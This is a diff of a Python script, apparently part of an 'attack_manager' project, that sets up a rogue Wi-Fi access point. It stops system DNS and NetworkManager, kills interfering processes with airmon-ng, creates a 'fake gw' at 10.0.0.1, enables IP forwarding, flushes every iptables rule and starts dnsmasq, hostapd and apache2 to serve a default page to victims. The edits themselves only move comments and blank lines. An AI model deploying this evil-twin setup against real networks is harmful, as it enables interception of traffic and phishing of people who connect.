@@ -6,33 +6,41 @@ from attack_manager import do_command
 sniffer_interface = sys.argv[1]
 network_name = sys.argv[2]
 
-
-do_command('systemctl disable systemd-resolved.service') # release port 53
-do_command('systemctl stop systemd-resolved')  # release port 53
-
+# release port 53
+do_command('systemctl disable systemd-resolved.service')
+do_command('systemctl stop systemd-resolved')
 
 do_command('service NetworkManager stop')
-ifconfig = "ifconfig " + sniffer_interface + " 10.0.0.1 netmask 255.255.255.0" # AP with address 10.0.0.1 with free 8 bits
+
+# AP with address 10.0.0.1 with free 8 bits
+ifconfig = "ifconfig " + sniffer_interface + " 10.0.0.1 netmask 255.255.255.0"
 
 do_command('airmon-ng check kill')
 do_command(ifconfig)
-do_command('route add default gw 10.0.0.1') # create fake gw
+# create fake gw
+do_command('route add default gw 10.0.0.1')
 
-do_command('echo 1 > /proc/sys/net/ipv4/ip_forward') # enable ip forwarding
+# enable ip forwarding
+do_command('echo 1 > /proc/sys/net/ipv4/ip_forward')
+
 # clear firewall ruled which might block some request
 do_command('iptables --flush')
 do_command('iptables --table nat --flush')
 do_command('iptables --delete-chain')
 do_command('iptables --table nat --delete-chain')
+
 # enable forwarding
 do_command('iptables -P FORWARD ACCEPT') #
+
 
 line = "python3 create_files.py " + sniffer_interface + " " + network_name
 do_command(line)
 
- # start the AP
+
+# start the AP
 do_command('dnsmasq -C dnsmasq.conf')
 do_command('hostapd hostapd.conf -B')
+
 
 # start the server for to broadcast our default page
 do_command('service apache2 start')
